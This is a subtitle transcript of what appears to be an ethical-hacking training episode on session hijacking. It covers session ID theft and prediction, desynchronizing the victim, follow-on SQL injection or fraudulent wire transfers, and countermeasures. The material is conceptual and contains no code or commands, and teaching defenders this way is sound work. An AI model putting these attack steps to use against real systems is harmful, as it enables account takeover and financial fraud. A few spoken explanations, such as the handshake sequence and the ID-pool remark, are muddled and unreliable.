hijacking.\n\n44\n00:02:10.270 --> 00:02:12.230\nWhen we get in to session hijacking,\n\n45\n00:02:12.230 --> 00:02:16.479\nwe're taking over valid TCP communications\nsessions between two computers.\n\n46\n00:02:16.479 --> 00:02:19.116\nAnd we're gonna then\nmanipulate that information,\n\n47\n00:02:19.116 --> 00:02:22.570\nthat flow of that discussion to\nour advantage as the bad actor.\n\n48\n00:02:22.570 --> 00:02:26.900\nMost authentication typically only occurs\nat the beginning of the TCP session right?\n\n49\n00:02:26.900 --> 00:02:30.174\nSo we know we have the three way\nhandshake, so we're doing the set up,\n\n50\n00:02:30.174 --> 00:02:31.460\nthe SYN, SYN-ACK, ACK.\n\n51\n00:02:31.460 --> 00:02:34.572\nSo we've gone through that, I haven't\ndone the three way handshake on camera.\n\n52\n00:02:34.572 --> 00:02:35.200\n&gt;&gt; We haven't, have we?\n\n53\n00:02:35.200 --> 00:02:37.880\n&gt;&gt; No, we should get Megan involved.\n\n54\n00:02:37.880 --> 00:02:38.450\n&gt;&gt; Yes.\n\n55\n00:02:38.450 --> 00:02:40.920\n&gt;&gt; Have her help us with that,\nshe could pass packets back and forth.\n\n56\n00:02:40.920 --> 00:02:42.400\n&gt;&gt; Yeah, she could be our prop person.\n\n57\n00:02:42.400 --> 00:02:43.930\n&gt;&gt; She could, she could, we could do that.\n\n58\n00:02:43.930 --> 00:02:46.610\nWell, we'll work on that, we may\nthink about doing that later for you.\n\n59\n00:02:46.610 --> 00:02:49.780\nBut you know what the three-way handshake\nlooks like, we've talked about that.\n\n60\n00:02:49.780 --> 00:02:51.340\nWe're sending out a SYN, right?\n\n61\n00:02:51.340 --> 00:02:54.240\nWe're then acknowledging that\nwith a SYN-ACK solution.\n\n62\n00:02:54.240 --> 00:02:58.140\nSo the ACK pairs with the SYN, and\nthen the SYN comes back the other way, and\n\n63\n00:02:58.140 --> 00:02:59.720\nwe do SYN-SYN-ACK-ACK.\n\n64\n00:02:59.720 --> 00:03:03.380\nSo, we've got that authentication that's\nset up that allows us to be able to\n\n65\n00:03:03.380 --> 00:03:04.870\nestablish communication.\n\n66\n00:03:04.870 --> 00:03:06.920\nBut we know that, more often than not,\n\n67\n00:03:06.920 --> 00:03:11.190\nauthentication only occurs as part of\nthe set up process initially, and so\n\n68\n00:03:11.190 --> 00:03:14.330\nwe can gain access to\nthe machine relatively easily.\n\n69\n00:03:14.330 --> 00:03:18.880\nAnd if we can do that and take over that\nsession, we could sniff all the traffic,\n\n70\n00:03:18.880 --> 00:03:22.540\nfigure out what's going on,\nmaybe do some sequence predictions.\n\n71\n00:03:22.540 --> 00:03:25.060\nSo we've talked about some of that,\nwe'll actually see that.\n\n72\n00:03:25.060 --> 00:03:27.570\nAnd talk about that a little\nbit more with session\n\n73\n00:03:27.570 --> 00:03:29.700\nhijacking as we get\ninto this conversation.\n\n74\n00:03:29.700 --> 00:03:34.009\nI'll show you a way that we can use some\ntools like an attack proxy such as the zap\n\n75\n00:03:34.009 --> 00:03:38.511\nattack proxy from OWASP to be able to look\nat information, pull it out of the wire,\n\n76\n00:03:38.511 --> 00:03:42.200\nand actually then start thinking\nabout what we would do to attack.\n\n77\n00:03:42.200 --> 00:03:45.618\nWe'll take a look at that as we do\na little hands on demo for you.\n\n78\n00:03:45.618 --> 00:03:49.060\nBut we've got the ability to go ahead and\ndo that, and then we can steal a session\n\n79\n00:03:49.060 --> 00:03:53.500\nid, and we can use it to authenticate\nourselves as the bad actor, and\n\n80\n00:03:53.500 --> 00:03:57.330\nessentially get rid of the good\ncommunicator, take their place.\n\n81\n00:03:57.330 --> 00:04:01.310\nAnd now we are in charge and\nwe are essentially now communicating.\n\n82\n00:04:01.310 --> 00:04:04.220\nWe've hijacked,\nwe've taken over that session, right?\n\n83\n00:04:04.220 --> 00:04:07.260\n&gt;&gt; We have basically allowed this other\nperson to establish the connection,\n\n84\n00:04:07.260 --> 00:04:09.500\nto go through the authentication process,\nand\n\n85\n00:04:09.500 --> 00:04:11.920\nthen just bump them out of the way and\nstep in.\n\n86\n00:04:11.920 --> 00:04:15.610\n&gt;&gt; Essentially, absolutely correct,\nessentially so and by doing that we\n\n87\n00:04:15.610 --> 00:04:18.970\nassume the identity is essentially\nthe session ID is the identity.\n\n88\n00:04:18.970 --> 00:04:23.550\nWe assume the identity of the good\nactor who has been removed as you said,\n\n89\n00:04:23.550 --> 00:04:28.160\nand now the system that we're talking to\nthinks that we are still the good actor.\n\n90\n00:04:28.160 --> 00:04:31.090\nThey don't know any different cuz\nwe are pretending to be them,\n\n91\n00:04:31.090 --> 00:04:32.398\nwe have the same session ID.\n\n92\n00:04:32.398 --> 00:04:35.970\nWe have information and credentials\nthat make us look as if we are.\n\n93\n00:04:35.970 --> 00:04:39.410\nThen if we're successful we're able to\nassume their identity, assume their\n\n94\n00:04:39.410 --> 00:04:43.730\nsession and carry on as them, which\nobviously can be very problematic right?\n\n95\n00:04:43.730 --> 00:04:47.030\nSo thinking about those things and\nthinking about how that works,\n\n96\n00:04:47.030 --> 00:04:48.840\nsome of the reasons why this happens.\n\n97\n00:04:48.840 --> 00:04:51.820\nWe don't use single\nsession identification.\n\n98\n00:04:51.820 --> 00:04:54.910\nSo we use a session ID that can\nbe respawned in other words, and\n\n99\n00:04:54.910 --> 00:04:56.700\ntherefore allow replay attacks.\n\n100\n00:04:56.700 --> 00:04:58.710\nWe don't have session time outs.\n\n101\n00:04:58.710 --> 00:05:03.130\nSo if we allow indefinite session\nexpiration times, where a session can\n\n102\n00:05:03.130 --> 00:05:07.670\nsimply go on, and on, and on and due to\ninactivity we don't time the session out.\n\n103\n00:05:07.670 --> 00:05:10.510\nWe potentially allow this\nbehavior to take place.\n\n104\n00:05:10.510 --> 00:05:13.898\nBanks, financial institutions in\nparticular have really become wise to this\n\n105\n00:05:13.898 --> 00:05:15.196\nover the last several years.\n\n106\n00:05:15.196 --> 00:05:19.177\nEarly on, when is it early on I mean,\nlet's say maybe 10, 12 years ago,\n\n107\n00:05:19.177 --> 00:05:21.380\nwe're not talking about long ago.\n\n108\n00:05:21.380 --> 00:05:24.670\nBut in the timeline and\nthe clock of information security,\n\n109\n00:05:24.670 --> 00:05:26.740\nthat's a lifetime ago if\nyou think about it, right?\n\n110\n00:05:26.740 --> 00:05:30.250\nSo, back a decade ago,\nI was a little less grey.\n\n111\n00:05:30.250 --> 00:05:34.090\nI was a little bit not quite so\nsnow covered up top.\n\n112\n00:05:34.090 --> 00:05:36.920\nYou guys have actually seen what that\nlooked like when we took a look at that\n\n113\n00:05:36.920 --> 00:05:37.690\nclip yesterday.\n\n114\n00:05:37.690 --> 00:05:43.040\nSo when I was a younger man, back in\nthe day, but when, maybe ten years ago.\n\n115\n00:05:43.040 --> 00:05:45.610\nWe're not talking that long ago,\nquite honestly.\n\n116\n00:05:45.610 --> 00:05:48.090\nA lot of the stuff you would do online,\n\n117\n00:05:48.090 --> 00:05:51.880\nif you were at the beginning of this\nidea of let's get into online banking.\n\n118\n00:05:51.880 --> 00:05:55.630\nLet's maybe look at our vendor site,\nmaybe we go and look at our account.\n\n119\n00:05:55.630 --> 00:05:58.740\nMaybe a transaction business,\npay a bill, who knows what.\n\n120\n00:05:58.740 --> 00:06:01.290\nIt's not like we haven't been\nable to do this for a while, but\n\n121\n00:06:01.290 --> 00:06:03.170\nwe haven't been able to do\nthis forever and a day, right?\n\n122\n00:06:03.170 --> 00:06:06.830\nThis is technology that has been around,\nmaybe 20 years or so,\n\n123\n00:06:06.830 --> 00:06:11.730\noverall the concept of electronic payment\ntransactions and things of that nature.\n\n124\n00:06:11.730 --> 00:06:16.600\nIn that time, early on,\na lot of these vendors before PCI DSS\n\n125\n00:06:16.600 --> 00:06:20.020\nbecame a reality for us,\nbefore we understood\n\n126\n00:06:20.020 --> 00:06:23.520\nin the information security community\nthat there is a better way, right?\n\n127\n00:06:23.520 --> 00:06:26.400\nA lot of this took place, and\na lot of this happened, and\n\n128\n00:06:26.400 --> 00:06:29.710\nwe weren't really thinking\nabout the fact that, yeah,\n\n129\n00:06:29.710 --> 00:06:32.960\nmaybe somebody will come in, and\ntry to take over this session.\n\n130\n00:06:32.960 --> 00:06:35.410\nWe understood early on, yeah,\nwe should use secure protocol.\n\n131\n00:06:35.410 --> 00:06:37.190\nSo it wasn't a question of saying,\n\n132\n00:06:37.190 --> 00:06:41.030\nhey, we're transmitting financial\ndata in the clear, that was obvious.\n\n133\n00:06:41.030 --> 00:06:45.320\nBut what wasn't so obvious was, if we just\ndon't establish session time outs, and\n\n134\n00:06:45.320 --> 00:06:46.640\nwe let the session run.\n\n135\n00:06:46.640 --> 00:06:48.715\nWhat if somebody walks away\nfrom the machine, right?\n\n136\n00:06:48.715 --> 00:06:51.313\nAnd so, here I am,\nwalking away from my machine, right?\n\n137\n00:06:51.313 --> 00:06:55.582\nAnd through the modern magic, here comes\nMike, coming over to my machine, right?\n\n138\n00:06:55.582 --> 00:06:57.151\nSo, there he is, the bad actor, right?\n\n139\n00:06:57.151 --> 00:06:59.418\n&gt;&gt; [LAUGH]\n&gt;&gt; And so Mike comes in, right, and\n\n140\n00:06:59.418 --> 00:07:01.470\nhere I come, back to my machine.\n\n141\n00:07:01.470 --> 00:07:04.610\nHello, and so I'm back, now,\nand I'm gonna do something, but\n\n142\n00:07:04.610 --> 00:07:08.250\nI don't realize that Mike may have come\nover, while I was away, and actually did\n\n143\n00:07:08.250 --> 00:07:13.290\nsomething that I was not aware of, because\nsince the session did not time out.\n\n144\n00:07:13.290 --> 00:07:16.370\nOr at least in theory, right, there\nwould not have been a timeout early on.\n\n145\n00:07:16.370 --> 00:07:19.060\nThe session would have\nremained active if I was not\n\n146\n00:07:19.060 --> 00:07:21.060\nsecurity conscious when I\nwalked away from my laptop.\n\n147\n00:07:21.060 --> 00:07:24.280\nIf I had not locked out the screen,\nright, or broken the connection, right?\n\n148\n00:07:24.280 --> 00:07:26.410\n&gt;&gt; I remember early on with a browser,\n\n149\n00:07:26.410 --> 00:07:30.340\nyou might make a connection to your\nfinancial institution, close your browser,\n\n150\n00:07:30.340 --> 00:07:32.070\nfive minutes later or three minutes later-\n&gt;&gt; The session would,\n\n151\n00:07:32.070 --> 00:07:32.830\nyou'd be able to pick it up.\n\n152\n00:07:32.830 --> 00:07:35.430\n&gt;&gt; Open your browser again,\nand you're still logged in.\n\n153\n00:07:35.430 --> 00:07:37.670\n&gt;&gt; Right, and so\nthis is interesting, right?\n\n154\n00:07:37.670 --> 00:07:40.370\nSo cuz this still actually\nhappens today on certain sites.\n\n155\n00:07:40.370 --> 00:07:44.972\nI could do that for instance in OneDrive,\nright, so for instance,\n\n156\n00:07:44.972 --> 00:07:49.350\non Microsoft's OneDrive,\nI'll log in, I'll do something.\n\n157\n00:07:49.350 --> 00:07:52.941\nI'll close it and I'll come back\nto IE three or four minutes later,\n\n158\n00:07:52.941 --> 00:07:56.599\nbring it up and I can go right back in,\nI don't have to authenticate.\n\n159\n00:07:56.599 --> 00:07:59.010\nDoesn't happen all the time,\ndepends on how long I wait.\n\n160\n00:07:59.010 --> 00:08:00.377\n&gt;&gt; Right.\n&gt;&gt; And what you're pointing out is\n\n161\n00:08:00.377 --> 00:08:01.939\nessentially what I just described.\n\n162\n00:08:01.939 --> 00:08:03.731\nThe session Time out variable and\n\n163\n00:08:03.731 --> 00:08:07.510\nthat's not something we set on\nour local machine in our browser.\n\n164\n00:08:07.510 --> 00:08:10.860\nWe're just simply governed\nby whatever the server site,\n\n165\n00:08:10.860 --> 00:08:15.000\nwhatever the vendor has set on their\nserver to deal with session time out.\n\n166\n00:08:15.000 --> 00:08:19.140\nSo, if the vendor, essentially\nthe bank in this case, Skydrive.\n\n167\n00:08:19.140 --> 00:08:23.290\nSo, Microsoft Onedrive whatever it is, if\nthey do not do that as you pointed it out,\n\n168\n00:08:23.290 --> 00:08:25.100\nyou would come back along,\n\n169\n00:08:25.100 --> 00:08:27.110\nbe able to open that browser\nup you'd be able to reconnect.\n\n170\n00:08:27.110 --> 00:08:30.720\n&gt;&gt; Which meant anybody that had access to\nmy computer could have opened up a browser\n\n171\n00:08:30.720 --> 00:08:31.810\nand reconnected as me.\n\n172\n00:08:31.810 --> 00:08:33.800\n&gt;&gt; Absolutely.\nMeghan could have come trotting along\n\n173\n00:08:33.800 --> 00:08:35.180\nhere and done this as well.\n\n174\n00:08:35.180 --> 00:08:38.390\nRight, we could have invited Ronnie in and\nmaybe Nate.\n\n175\n00:08:38.390 --> 00:08:40.239\nIt could have been a party.\n\n176\n00:08:40.239 --> 00:08:40.860\nCool.\n&gt;&gt; Absolutely.\n\n177\n00:08:40.860 --> 00:08:42.239\n&gt;&gt; ITProTV part on Adam's laptop, right?\n\n178\n00:08:42.239 --> 00:08:44.250\n&gt;&gt; And so\n&gt;&gt; Now that same financial institution\n\n179\n00:08:44.250 --> 00:08:48.450\nis still used if I walk away from\nmy computer and come back or\n\n180\n00:08:48.450 --> 00:08:51.220\nleave it sitting for\nmaybe four, five minutes.\n\n181\n00:08:51.220 --> 00:08:54.530\nI get a pop up that says click\nOK if you're still there.\n\n182\n00:08:54.530 --> 00:08:56.480\nAnd if I don't, it kills my sessions.\n\n183\n00:08:56.480 --> 00:08:57.000\n&gt;&gt; Right.\nSo\n\n184\n00:08:57.000 --> 00:08:59.500\nthey've given you the option to\nessentially opt back in, right.\n\n185\n00:08:59.500 --> 00:09:02.420\nSo they're saying hey if\nyou just got distracted and\n\n186\n00:09:02.420 --> 00:09:03.830\nyou know your doing something over.\n\n187\n00:09:03.830 --> 00:09:07.080\nLet's say playing around, and\nall of a sudden you come back over and\n\n188\n00:09:07.080 --> 00:09:09.360\nyour giving you the option to\nstay connected, which is nice.\n\n189\n00:09:09.360 --> 00:09:10.730\nI don't particularly care for that.\n\n190\n00:09:10.730 --> 00:09:14.230\nI think they should just time you out and\nthe should be the end of it because your\n\n191\n00:09:14.230 --> 00:09:18.160\ngiving the bad actor to opt in and\nessentially keep the session alive.\n\n192\n00:09:18.160 --> 00:09:21.230\nI think the more information gives\nsomebody gives the less likely it is that\n\n193\n00:09:21.230 --> 00:09:23.530\nthings are gonna go your way.\n\n194\n00:09:23.530 --> 00:09:25.320\nBut having said that,\nthat's just my preference.\n\n195\n00:09:25.320 --> 00:09:25.850\nLet me be clear.\n\n196\n00:09:25.850 --> 00:09:27.360\nI'm not saying it's a good or a bad thing.\n\n197\n00:09:27.360 --> 00:09:28.410\nI'm pointing out my opinion.\n\n198\n00:09:28.410 --> 00:09:32.158\nAnd my opinion is I just don't think that\nparticular aspect of this is a good idea.\n\n199\n00:09:32.158 --> 00:09:34.441\nBut overall,\nwhat they're doing is a good idea.\n\n200\n00:09:34.441 --> 00:09:36.432\n[CROSSTALK]\n&gt;&gt; Yeah.\n\n201\n00:09:36.432 --> 00:09:38.777\n&gt;&gt; Absolutely, so\n&gt;&gt; We have to think about that,\n\n202\n00:09:38.777 --> 00:09:41.250\nmake sure we're comfortable\nwith that idea.\n\n203\n00:09:41.250 --> 00:09:43.400\nWeak session id generation algorithms or\n\n204\n00:09:43.400 --> 00:09:47.010\nsmall session ids, just like everywhere\nelse we've talked about this.\n\n205\n00:09:47.010 --> 00:09:51.810\nThe size of the key space,\nthe size of the initialization vector,\n\n206\n00:09:51.810 --> 00:09:56.610\nthe amount of things we can choose from,\nthe smaller that window is\n\n207\n00:09:56.610 --> 00:09:59.890\nthe smaller that pool the less likely\nit is we're gonna have a problem.\n\n208\n00:09:59.890 --> 00:10:03.120\nWhen we're doing predictive analytics\nwe're doing prediction attacks\n\n209\n00:10:03.120 --> 00:10:06.650\nwe're trying to sequence things,\nwe're trying to guess session IDs.\n\n210\n00:10:06.650 --> 00:10:09.550\nThe more stuff I gotta figure\nout the harder it is for\n\n211\n00:10:09.550 --> 00:10:11.030\nme as an attacker to do that.\n\n212\n00:10:11.030 --> 00:10:13.910\nThe less likely it is I will\nbe successful, in other words.\n\n213\n00:10:13.910 --> 00:10:15.940\nIf you make it that much more difficult.\n\n214\n00:10:15.940 --> 00:10:20.100\nIf you give me five things, put them on\nthe table and say okay, which two match?\n\n215\n00:10:20.100 --> 00:10:22.630\nI'm gonna be able to get\nto that pretty quickly.\n\n216\n00:10:22.630 --> 00:10:24.420\nEven if I got to try a few combinations.\n\n217\n00:10:24.420 --> 00:10:25.730\nThere's only five things, right?\n\n218\n00:10:26.830 --> 00:10:27.960\n&gt;&gt; Right.\n&gt;&gt; 20 different permutations and\n\n219\n00:10:27.960 --> 00:10:29.210\nwhat I could do with that\n&gt;&gt; And\n\n220\n00:10:29.210 --> 00:10:30.830\nI'm gonna figure it out pretty quickly.\n\n221\n00:10:30.830 --> 00:10:33.650\nBut if there's 5,000 it's\ngonna take me a lot longer.\n\n222\n00:10:33.650 --> 00:10:37.280\nIf there's five million, we're not\ngonna be around when I figure it out.\n\n223\n00:10:37.280 --> 00:10:40.790\nRight, I'm gonna have to hand that\ndown to several generations, yet\n\n224\n00:10:40.790 --> 00:10:42.250\nanother reason why we need interns right?\n\n225\n00:10:42.250 --> 00:10:42.795\n&gt;&gt; Yes.\n[LAUGH]\n\n226\n00:10:42.795 --> 00:10:43.704\n&gt;&gt; But I hand that down several\n\n227\n00:10:43.704 --> 00:10:45.840\ngenerations\n&gt;&gt; Until we get somebody\n\n228\n00:10:45.840 --> 00:10:48.070\nto be persistent in taking care of that.\n\n229\n00:10:48.070 --> 00:10:51.370\nSo we've talked about this time and\ntime again, right?\n\n230\n00:10:51.370 --> 00:10:55.430\nWe've got to extend that workspace,\nextend the capabilities\n\n231\n00:10:55.430 --> 00:10:59.910\nof our ability to hide inside\nall those different options,\n\n232\n00:10:59.910 --> 00:11:03.030\nall those different permutations\nuntil we find the right one.\n\n233\n00:11:03.030 --> 00:11:06.800\nThe more things going on, the less likely\nit is the attackers gonna figured it out.\n\n234\n00:11:06.800 --> 00:11:10.750\nThis is just a standing rule\n&gt;&gt; That we as certified ethical hackers,\n\n235\n00:11:10.750 --> 00:11:11.840\neventually, hopefully,\n\n236\n00:11:11.840 --> 00:11:15.410\nwhen all of you are successful,\nas security professionals of any kind,\n\n237\n00:11:15.410 --> 00:11:19.570\nregardless of what letters come after\nyour name, whether you have any or not.\n\n238\n00:11:19.570 --> 00:11:23.120\nAnd I know many people that are not\ncertified, but no more than I do,\n\n239\n00:11:23.120 --> 00:11:25.020\nbecause they've been\ndoing this a lot longer.\n\n240\n00:11:25.020 --> 00:11:27.700\nAnd the goal is,\nyou have to understand this stuff,\n\n241\n00:11:27.700 --> 00:11:29.930\nnot to put a bunch of\nletters after your name.\n\n242\n00:11:29.930 --> 00:11:32.090\nJust because you went out and\ngot a piece of paper,\n\n243\n00:11:32.090 --> 00:11:35.245\ndoesn't mean necessarily that\nyou're good at what you do.\n\n244\n00:11:35.245 --> 00:11:39.415\nPutting this knowledge to practical\nuse in the real world, and\n\n245\n00:11:39.415 --> 00:11:42.835\napplying it is the difference between,\nbeing good at what you do and\n\n246\n00:11:42.835 --> 00:11:45.365\nbeing able to explain to people\nwhat you should do, right?\n\n247\n00:11:45.365 --> 00:11:48.225\nAnd so you wanna make sure that when\nyou're applying this knowledge,\n\n248\n00:11:48.225 --> 00:11:49.365\nyou think about this stuff.\n\n249\n00:11:49.365 --> 00:11:51.895\nAnd this is where\nthe rubber meets the road.\n\n250\n00:11:51.895 --> 00:11:53.930\nI hate that expression, but\nI just don't have a better one.\n\n251\n00:11:53.930 --> 00:11:56.505\n&gt;&gt; [LAUGH]\n&gt;&gt; This is where the tires squeal, right,\n\n252\n00:11:56.505 --> 00:11:58.500\nas you're burning out\nhere trying to create\n\n253\n00:11:58.500 --> 00:12:00.690\n&gt;&gt; A really cool security function.\n\n254\n00:12:00.690 --> 00:12:02.930\nThis in other words is what we\nneed to do to be successful.\n\n255\n00:12:02.930 --> 00:12:05.670\nThis is how we counter session hijack and\n\n256\n00:12:05.670 --> 00:12:08.490\nit's important as we start this\nconversation to think about this right.\n\n257\n00:12:08.490 --> 00:12:10.810\nWe wanna know that we should\nbe encrypting the connection.\n\n258\n00:12:10.810 --> 00:12:13.970\nWe wanna know that we should be\nadding multi factor authentication.\n\n259\n00:12:13.970 --> 00:12:15.500\nWe know about all these stuff.\n\n260\n00:12:15.500 --> 00:12:18.900\nBut even with all that,\nif we allow unlimited session ID's or\n\n261\n00:12:18.900 --> 00:12:23.250\nrather unlimited session timeout,\nand we don't get smart at spawning\n\n262\n00:12:23.250 --> 00:12:27.860\nmultiple session ID's within a system\nthat randomizes them to a degree.\n\n263\n00:12:27.860 --> 00:12:29.855\nSo we can hide in the numbers.\n\n264\n00:12:29.855 --> 00:12:32.485\nAnd if we don't get smart\nabout using single session or\n\n265\n00:12:32.485 --> 00:12:35.665\nsingle instance session id, so\nthat they can't be repeated\n\n266\n00:12:35.665 --> 00:12:38.845\nwere inviting the bad actors to\ncome in and take advantage of us.\n\n267\n00:12:38.845 --> 00:12:41.890\nSo, we want to be aware of that\nlike anything else, right?\n\n268\n00:12:41.890 --> 00:12:45.670\nKnowing what to do ahead of time,\npreparing to be successful is\n\n269\n00:12:45.670 --> 00:12:49.610\nalways gonna put us in a better place than\nfiguring out after the fact that we should\n\n270\n00:12:49.610 --> 00:12:53.075\nhave done those things and of course,\nunfortunately did not for whatever reason.\n\n271\n00:12:53.075 --> 00:12:53.620\n&gt;&gt; Mm-hm.\n\n272\n00:12:53.620 --> 00:12:56.690\n&gt;&gt; Whether we're stealing, whether we're\nguessing, whether we're broot forcing,\n\n273\n00:12:57.850 --> 00:13:00.020\nultimately that's what session\nhijacking is all about, right?\n\n274\n00:13:00.020 --> 00:13:01.550\nIt's about stealing something.\n\n275\n00:13:01.550 --> 00:13:04.620\nGuessing something or brute forcing\nit to figure out the password,\n\n276\n00:13:04.620 --> 00:13:06.470\nthe session ID, the key,\n\n277\n00:13:06.470 --> 00:13:11.330\nwhatever it may be, in order to be able to\nget information that's gonna allow us in.\n\n278\n00:13:11.330 --> 00:13:13.580\nSo we want to be aware of this and\nUnderstand this.\n\n279\n00:13:13.580 --> 00:13:15.450\nWe typically start out sniffing.\n\n280\n00:13:15.450 --> 00:13:19.740\nWe've talked about this and sniffing as I\nsaid, reconnaissance, fingerprinting and\n\n281\n00:13:19.740 --> 00:13:23.860\nsniffing overall are the ways in which\nwe start to find this information.\n\n282\n00:13:23.860 --> 00:13:26.390\nWe wanna monitor the flow\nof packets back and\n\n283\n00:13:26.390 --> 00:13:30.350\nforth looking at sequence information,\nlooking at data.\n\n284\n00:13:30.350 --> 00:13:32.700\nTrying to figure out how to\npredict the sequence number,\n\n285\n00:13:32.700 --> 00:13:35.070\nright if I said to you 1 3 5 7.\n\n286\n00:13:35.070 --> 00:13:37.030\nWhat would like to be the next one up?\n\n287\n00:13:37.030 --> 00:13:38.250\nI made it simple by the way,\n\n288\n00:13:38.250 --> 00:13:42.580\npointing out if you get this wrong-\n&gt;&gt; The pressure is on.\n\n289\n00:13:42.580 --> 00:13:46.060\n&gt;&gt; Megan's gonna replace you, you're gonna\nstart switching if you get this one wrong.\n\n290\n00:13:46.060 --> 00:13:46.900\nSo-\n&gt;&gt; I'm gonna say 9.\n\n291\n00:13:46.900 --> 00:13:47.820\n&gt;&gt; Alright and you would be right.\n\n292\n00:13:47.820 --> 00:13:50.170\nMegan you're gonna stay where you\nare cuz he got this one right.\n\n293\n00:13:50.170 --> 00:13:54.190\nSo when we think about session\nprediction like Mike and I just did.\n\n294\n00:13:54.190 --> 00:13:58.190\nWe know there's a pattern and so\nobviously clearly looking at that pattern,\n\n295\n00:13:58.190 --> 00:14:02.600\nif I'm the bad actor and Mike essentially\nis the bad actor in this example.\n\n296\n00:14:02.600 --> 00:14:04.210\nIf he's saying, okay so the next number,\n\n297\n00:14:04.210 --> 00:14:08.120\nthe next session that should be nine with\nthat knowledge might could go in and\n\n298\n00:14:08.120 --> 00:14:12.760\nattempt to take that session ID,\nuse it, and then be able to actually\n\n299\n00:14:12.760 --> 00:14:16.090\nrespond the connection and\npretend to be somebody, right?\n\n300\n00:14:16.090 --> 00:14:19.470\nWhat we would do though is,\nwe would do session desynchronization.\n\n301\n00:14:19.470 --> 00:14:23.150\nMike would have to knock me out,\nright break the connection to my machine,\n\n302\n00:14:23.150 --> 00:14:24.210\nthe victim machine.\n\n303\n00:14:24.210 --> 00:14:27.760\nHe would then take over the session\nusing session ID prediction, and\n\n304\n00:14:27.760 --> 00:14:31.160\nthen he saying session ID\nnine let's say back in.\n\n305\n00:14:31.160 --> 00:14:34.380\nAnd then what he would do is\nhe would command inject or\n\n306\n00:14:34.380 --> 00:14:36.970\ndo injection attacks or\nwhatever the case would be.\n\n307\n00:14:36.970 --> 00:14:40.860\nWe've Had a whole series of\nconversations in the web hacking,\n\n308\n00:14:40.860 --> 00:14:43.340\nweb application hacking, and SQL injection\n\n309\n00:14:43.340 --> 00:14:46.880\nareas where we've talked about all this\nstuff in those particular episodes.\n\n310\n00:14:46.880 --> 00:14:48.800\nObviously encourage you to take\na look of some of that there.\n\n311\n00:14:48.800 --> 00:14:51.850\nBut the generic idea is that\nhe'll start injecting packets.\n\n312\n00:14:51.850 --> 00:14:54.990\nAgainst the target server looking\nto then gain advantage or\n\n313\n00:14:54.990 --> 00:14:56.340\nwhatever the case may be.\n\n314\n00:14:56.340 --> 00:15:01.580\nSo this is what we will do kind of step\nby step at a high level to the process.\n\n315\n00:15:01.580 --> 00:15:05.660\nIf we want to understand the logic of this\nbecause there's several things all going\n\n316\n00:15:05.660 --> 00:15:09.880\non at once right we gotta start\nsniffing we gotta monitor passively.\n\n317\n00:15:09.880 --> 00:15:12.200\nWe've then gotta do\nsection I.D prediction.\n\n318\n00:15:12.200 --> 00:15:16.870\nThen we gotta actively interdict to de\nauthorize and de culpable the user and\n\n319\n00:15:16.870 --> 00:15:19.260\nthen we connect and take over as them.\n\n320\n00:15:19.260 --> 00:15:21.329\n&gt;&gt; It does not sound like\nthe easiest attack to pull off.\n\n321\n00:15:22.340 --> 00:15:27.910\nAs attacks go, it sounds a lot like\nyeah I've got five balls in the air,\n\n322\n00:15:27.910 --> 00:15:29.310\nI'm just kinda crazy busy.\n\n323\n00:15:29.310 --> 00:15:33.450\nAnd If anything goes wrong or doesn't\nhappen in order, it's not gonna work well.\n\n324\n00:15:33.450 --> 00:15:36.610\nAnd that is true at one level,\nbut as things go, believe it or\n\n325\n00:15:36.610 --> 00:15:39.930\nnot SQL injection, and you know we\ntalk about it before we got started.\n\n326\n00:15:39.930 --> 00:15:44.210\nSQL injection attacks as we talk\nabout in this episode are actually.\n\n327\n00:15:44.210 --> 00:15:48.580\nA lot more technically challenging just\nbecause of the manipulation of code and\n\n328\n00:15:48.580 --> 00:15:52.970\nthe understanding of the code in order\nto actually get the results you want.\n\n329\n00:15:52.970 --> 00:15:56.506\nSo it's the specificity of that\nparticular needs in the attack that makes\n\n330\n00:15:56.506 --> 00:16:00.099\nit a little more challenging, at least\nfrom perspective because I just can\n\n331\n00:16:00.099 --> 00:16:02.452\nnot type to save me life so\nI have constant typos.\n\n332\n00:16:02.452 --> 00:16:05.916\nSo for\nme that's always been my downfall but\n\n333\n00:16:05.916 --> 00:16:10.233\nin terms of the technicality\nOf setting up the attack.\n\n334\n00:16:10.233 --> 00:16:11.920\n&gt;&gt; Mm-hm.\n&gt;&gt; It is challenging to set it up.\n\n335\n00:16:11.920 --> 00:16:13.742\nBut once you've got it going and\n\n336\n00:16:13.742 --> 00:16:17.870\nthe tools that we use make it not very\ndifficult to do, believe it or not.\n\n337\n00:16:17.870 --> 00:16:18.740\n&gt;&gt; There's an app for that.\n\n338\n00:16:18.740 --> 00:16:19.820\n&gt;&gt; There is an app for that.\n\n339\n00:16:19.820 --> 00:16:20.882\n&gt;&gt; [LAUGH]\n&gt;&gt; Absolutely,\n\n340\n00:16:20.882 --> 00:16:24.562\nbecause if you had to do this on your own\nit would probably befuddle most average\n\n341\n00:16:24.562 --> 00:16:25.176\nhuman beings.\n\n342\n00:16:25.176 --> 00:16:26.403\nThere's no doubt about it.\n\n343\n00:16:26.403 --> 00:16:28.634\nIt is a complicated series and\nsequence of steps.\n\n344\n00:16:28.634 --> 00:16:30.760\n&gt;&gt; Mm-hm.\n&gt;&gt; But from my perspective,\n\n345\n00:16:30.760 --> 00:16:34.210\nI think, once you've got the sequencing\ndown and you have the mechanics down,\n\n346\n00:16:34.210 --> 00:16:37.880\nhitting the buttons and\nthen doing that stuff is the setup for\n\n347\n00:16:37.880 --> 00:16:40.900\nthe stuff that's really complicated,\nafter which, as I said, I think, is\n\n348\n00:16:40.900 --> 00:16:45.380\nthe command injection piece, which is, now\nthat I'm in, what is the endgame, right?\n\n349\n00:16:45.380 --> 00:16:47.390\nWhat is it I'm looking to do?\n\n350\n00:16:47.390 --> 00:16:51.130\nWhat is it ultimately that I\nwanna get from that server?\n\n351\n00:16:51.130 --> 00:16:52.270\nIs it a bank server and\n\n352\n00:16:52.270 --> 00:16:56.850\nI wanna be able to execute a SQL injection\nof some kind to dump the member database?\n\n353\n00:16:56.850 --> 00:16:58.930\nI'm looking for\naccount information, maybe.\n\n354\n00:16:58.930 --> 00:17:01.780\nIs it that I wanna try to execute\na fake wire transfer or something?\n\n355\n00:17:01.780 --> 00:17:04.730\nI'm gonna get in there I'm\ngonna send some exploit code or\n\n356\n00:17:04.730 --> 00:17:08.130\nI may just try the execute the wire\ntransfer as a legitimate user, right?\n\n357\n00:17:08.130 --> 00:17:10.550\nSo a normal operation not\nin any way modified or\n\n358\n00:17:10.550 --> 00:17:14.520\ndeal with the backend other than to\nsimply say I'm pretending to somebody so\n\n359\n00:17:14.520 --> 00:17:16.542\nyou were pretending to be 